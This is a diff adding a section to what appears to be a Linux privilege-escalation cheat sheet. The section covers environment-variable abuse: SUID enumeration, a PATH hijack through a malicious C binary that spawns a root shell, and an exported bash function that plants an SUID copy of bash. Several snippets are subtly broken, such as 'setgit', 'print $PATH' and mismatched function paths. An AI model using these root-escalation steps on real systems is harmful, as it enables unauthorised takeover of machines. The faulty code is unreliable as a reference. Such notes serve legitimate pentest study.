@@ -317,8 +317,54 @@ Look for SUID bit set on `sudo` and read/write in `/var/log/nginx`
 ### Exploitation
 Exploit via [CVE-2016-1247](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
 
-## Environmental Variabls
+## Environmental Variables
+### Summary
+Environmental Variables - Variables that are available system wide and are inherited by all spawned child processes and shells
+To exploit, We're going to change the path variable to take advantage of an SUID or, in the case of an explicit path, we are going to create and export a function that allows us to escalate. 
+> Linux evaluates the path from front to back, so if you add a folder to the front of the path, it will look there first for the command you're trying to execute.
+### Enumeration
+- Show variables
+```
+env
+```
+- show `PATH`
+```
+print $PATH
+```
+- Using `find` to show us `SUID` binaries
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+- Use strings to see what the `SUID` command/program does.
+```
+strings [SUID command/program]
+```
+Here we looking for what this thing actually does, such as starting a service, etc.
+One we identify what it does, let's see if we can change the path so it executes a malicious executable rather than the standard one it's calling
 
+### Exploitation via the `$PATH` variable
+- Sample malicious executable
+```
+echo 'int main () {setgit(0); setuid(0); system("/bin/bash"); return 0;}' > service.c
+
+# Compile
+gcc service.c -o service
+```
+- Exploitation
+    1. Drop our malicious service in `/tmp`
+    2. Add to our path (`export PATH=/tmp:$PATH`)
+    3. `Print $PATH` (to verify)
+    4. Run our `SUID` command/example
+
+### Exploitation if our malicious `SUID` uses an explicit path
+- Summary
+In this example, instead of changing the path, we're going to create a function and then export that function to hijack a process/command
+- Sample Function
+```
+function /usr/bsbin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}
+export -f /usr/sbin/service
+```
+- run our privileged command/executable
 # Escalation Path: Capabilities
 
 # Escalation Path: Scheduled Tasks
